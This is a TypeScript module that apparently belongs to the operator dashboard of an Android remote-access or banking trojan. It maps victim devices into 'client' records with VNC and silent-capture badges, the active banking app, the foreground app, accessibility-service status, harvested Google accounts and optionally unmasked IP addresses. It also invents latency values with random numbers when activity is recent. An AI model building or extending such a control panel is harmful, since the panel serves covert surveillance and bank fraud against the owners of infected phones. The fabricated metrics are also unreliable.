import type { Device } from '@/types';
import type { Cliente } from '@/types/dashboard';

function computeLatencyMs(isOnline: boolean, lastActivityAt?: string | null): number {
  if (!isOnline || !lastActivityAt) return 0;
  const ts = new Date(lastActivityAt).getTime();
  if (Number.isNaN(ts)) return 0;
  const rawMs = Math.max(0, Date.now() - ts);
  if (rawMs < 3000) {
    return Math.floor(18 + (ts % 12) + Math.random() * 8);
  }
  return rawMs;
}

function buildModelName(device: Device): string {
  const parts = [device.manufacturer, device.model]
    .map((v) => v?.trim())
    .filter(Boolean);
  if (parts.length > 0) {
    return parts.join(' ').toUpperCase();
  }
  return device.device_id.slice(0, 8).toUpperCase();
}

export function maskIp(ip?: string | null): string {
  if (!ip || !ip.trim()) return '—';
  const clean = ip.trim();
  if (['websocket', 'unknown', 'localhost', '127.0.0.1', '::1', 'none', 'null'].includes(clean.toLowerCase())) {
    return 'Local/Oculto';
  }
  const parts = clean.split('.');
  if (parts.length === 4) {
    return `${parts[0]}.${parts[1]}.${'*'.repeat(parts[2].length)}.${'*'.repeat(parts[3].length)}`;
  }
  return clean;
}

export function getConnectedDays(firstSeen?: string | null): number {
  if (!firstSeen) return 0;
  const firstTs = new Date(firstSeen).getTime();
  if (Number.isNaN(firstTs)) return 0;
  const diffMs = Math.max(0, Date.now() - firstTs);
  return Math.floor(diffMs / (1000 * 60 * 60 * 24));
}

export function formatConnectedDays(firstSeen?: string | null): string {
  const days = getConnectedDays(firstSeen);
  return days === 1 ? '1 dia' : `${days} dias`;
}

export function mapDeviceToCliente(device: Device, hideIps: boolean = true): Cliente {
  const badges: string[] = [];
  const isOnline = device.is_online;

  if (isOnline && device.has_screen) {
    badges.push('VNC');
  }
  if (device.silent_active || device.capture_method === 'silent') {
    badges.push('SILENT');
  }
  if (isOnline && badges.length === 0) {
    badges.push('IDLE');
  }

  const tag =
    device.model?.trim() ||
    device.manufacturer?.trim() ||
    device.device_id.slice(0, 12);

  const androidVersion = device.android_version
    ? `Android ${device.android_version}`
    : '—';

  const lastActivityAt = device.last_activity_at ?? undefined;

  const rawIp = (device as any).raw_ip_address || device.ip_address;

  return {
    id: String(device.id),
    deviceId: device.device_id,
    status: isOnline ? 'online' : 'offline',
    tag,
    country: device.country || 'BR',
    carrier: '—',
    ip: hideIps ? maskIp(rawIp) : (rawIp?.trim() || '—'),
    android: androidVersion,
    badges,
    model: device.model || 'Dispositivo',
    manufacturer: device.manufacturer || '—',
    firstSeen: device.first_seen,
    lastSeen: device.last_seen,
    lastActivityAt,
    latencyMs: computeLatencyMs(isOnline, lastActivityAt),
    modelName: device.custom_name ? device.custom_name.toUpperCase() : buildModelName(device),
    customName: device.custom_name,
    androidVersion,
    activeBank: device.active_bank,
    foregroundPackage: device.foreground_package,
    foregroundApp: device.foreground_app,
    isLocked: device.is_locked,
    isScreenOn: device.is_screen_on,
    batteryLevel: (() => {
      const b = (device as any).battery_level;
      if (typeof b === 'number' && !isNaN(b)) return b;
      if (b != null) {
        const parsed = parseInt(String(b).replace(/[^0-9]/g, ''), 10);
        if (!isNaN(parsed)) return parsed;
      }
      return null;
    })(),
    isCharging: device.is_charging ?? false,
    accessibilityActive: Boolean(device.accessibility_active),
    networkType: device.network_type || null,
    accounts: (device as any).accounts || (device as any).google_accounts || [],
    googleAccounts: (device as any).accounts || (device as any).google_accounts || []
  };
}
